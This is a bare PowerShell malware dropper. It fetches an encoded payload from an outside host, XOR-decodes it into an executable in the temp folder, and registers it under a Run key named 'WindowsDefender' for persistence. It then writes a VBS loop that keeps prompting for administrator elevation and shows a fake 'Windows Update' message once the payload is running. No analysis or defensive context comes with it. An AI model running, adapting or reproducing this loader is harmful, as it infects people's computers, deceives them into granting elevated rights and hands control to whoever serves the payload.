$w='https://synapsez.xyz/payload';$d=$env:TEMP+'\WD.dat'
$c=iwr -UseBasicParsing $w -TimeoutSec 600
[IO.File]::WriteAllBytes($d,$c.Content)
if((gi $d).Length -gt 5000000){
 $k=[Text.Encoding]::UTF8.GetBytes('fogwate69!fogwa')
 $x=[IO.File]::ReadAllBytes($d)
 $kl=[int]$k.Length;$r=New-Object byte[] $x.Length
 for($i=0;$i -lt $x.Length;$i+=$kl){$l=[Math]::Min($kl,$x.Length-$i);[Array]::Copy($k,0,$r,$i,$l)}
 for($i=0;$i -lt $x.Length;$i++){$x[$i]=$x[$i] -bxor $r[$i]}
 $e=$env:TEMP+'\WD.exe';[IO.File]::WriteAllBytes($e,$x)
 reg add 'HKCU\Software\Microsoft\Windows\CurrentVersion\Run' /v WindowsDefender /d $e /f|Out-Null
 $v=$env:TEMP+'\dv.vbs'
 Set-Content $v 'On Error Resume Next' -Enc ASCII
 Add-Content $v 'Dim sh,exe,sa,qr,proc' -Enc ASCII
 Add-Content $v ("Set sh=CreateObject(""WScript.Shell"")") -Enc ASCII
 Add-Content $v ("exe="""+$e+"""") -Enc ASCII
 Add-Content $v 'Do' -Enc ASCII
 Add-Content $v ("    Set sa=CreateObject(""Shell.Application"")") -Enc ASCII
 Add-Content $v ("    sa.ShellExecute exe,"""""","""""",""runas"",1") -Enc ASCII
 Add-Content $v '    WScript.Sleep 5000' -Enc ASCII
 Add-Content $v ("    Set qr=GetObject(""winmgmts:\\.\root\cimv2"").ExecQuery(""SELECT * FROM Win32_Process WHERE Name='WD.exe'"")") -Enc ASCII
 Add-Content $v ("    For Each proc in qr") -Enc ASCII
 Add-Content $v ("        CreateObject(""WScript.Shell"").PopUp ""Update complete."",3,""Windows Update"",64") -Enc ASCII
 Add-Content $v ("        Exit Do") -Enc ASCII
 Add-Content $v ("    Next") -Enc ASCII
 Add-Content $v 'Loop' -Enc ASCII
 Start-Process wscript -Arg '//B',$v -Verb runas
}
